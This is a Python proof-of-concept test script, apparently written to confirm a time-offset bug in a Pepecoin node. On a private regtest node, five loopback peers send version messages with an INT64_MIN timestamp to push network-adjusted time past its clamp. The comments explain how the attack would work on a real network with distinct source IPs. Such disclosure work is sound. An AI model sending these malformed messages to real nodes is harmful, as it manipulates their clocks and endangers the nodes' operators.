#!/usr/bin/env python3
# Copyright (c) 2024 The Pepecoin Core developers
# Distributed under the MIT software license.
#
# Proof of concept (local regtest / isolated node only):
# Several inbound peers each send a `version` message whose nTime is INT64_MIN.
# Because AddTimeData()/abs64() mishandles INT64_MIN, the node's network-adjusted
# time (GetAdjustedTime / getnetworkinfo.timeoffset) is driven far outside the
# +/- maxtimeadjustment clamp that is supposed to bound peer influence.
#
# This does NOT touch any public infrastructure: it spins up a private regtest
# pepecoind and connects loopback mininode peers to it.
#
# NOTE ON LOOPBACK LIMITATION: AddTimeData() de-duplicates samples by source IP
# (the static setKnown set in timedata.cpp), so multiple connections from
# 127.0.0.1 only contribute ONE sample and cannot own the median on a single
# host.  On a real network the attacker uses distinct source IPs.  The
# authoritative, deterministic confirmation of the abs64(INT64_MIN) clamp bypass
# is the unit test src/test/pepecoin_timedata_tests.cpp, which drives
# AddTimeData() directly with distinct addresses.  This script documents the
# network-facing shape of the attack.

import struct
import time

from test_framework.mininode import (
    NodeConn, NodeConnCB, msg_version, msg_verack, NetworkThread,
    MY_VERSION, MY_SUBVERSION, CAddress,
)
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import p2p_port, assert_greater_than

INT64_MIN = -(2 ** 63)


class TimeWarpConn(NodeConnCB):
    def __init__(self, evil_time):
        NodeConnCB.__init__(self)
        self.evil_time = evil_time
        self.sent_version = False

    def on_open(self, conn):
        # Send our own crafted version with the hostile timestamp.
        vt = msg_version()
        vt.nVersion = MY_VERSION
        vt.nServices = 1
        vt.nTime = self.evil_time
        vt.addrTo = CAddress()
        vt.addrFrom = CAddress()
        vt.nNonce = 0x1234
        vt.strSubVer = MY_SUBVERSION
        vt.nStartingHeight = 0
        vt.nRelay = 0
        conn.send_message(vt)
        self.sent_version = True

    def on_version(self, conn, message):
        conn.send_message(msg_verack())


class TimeWarpPoC(BitcoinTestFramework):
    def __init__(self):
        super().__init__()
        self.num_nodes = 1
        self.setup_clean_chain = True

    def setup_network(self):
        # send_version=False so mininode doesn't auto-send a well-formed version.
        self.nodes = self.setup_nodes()

    def run_test(self):
        node = self.nodes[0]
        baseline = node.getnetworkinfo()["timeoffset"]
        self.log.info("baseline timeoffset = %d" % baseline)

        connections = []
        cbs = []
        for i in range(5):
            cb = TimeWarpConn(INT64_MIN)
            c = NodeConn('127.0.0.1', p2p_port(0), node, cb, send_version=False)
            cb.add_connection(c)
            connections.append(c)
            cbs.append(cb)

        NetworkThread().start()
        time.sleep(5)

        info = node.getnetworkinfo()
        offset = info["timeoffset"]
        self.log.info("timeoffset after 5 hostile peers = %d" % offset)

        # If the clamp worked, |offset| would be <= maxtimeadjustment (default 70m).
        # We assert the PoC succeeded in blowing past it.
        assert abs(offset) > 70 * 60, \
            "offset %d stayed within the clamp - node is not vulnerable" % offset
        self.log.info("VULNERABLE: peer-controlled timeoffset escaped the clamp")

        for c in connections:
            c.disconnect_node()


if __name__ == '__main__':
    TimeWarpPoC().main()
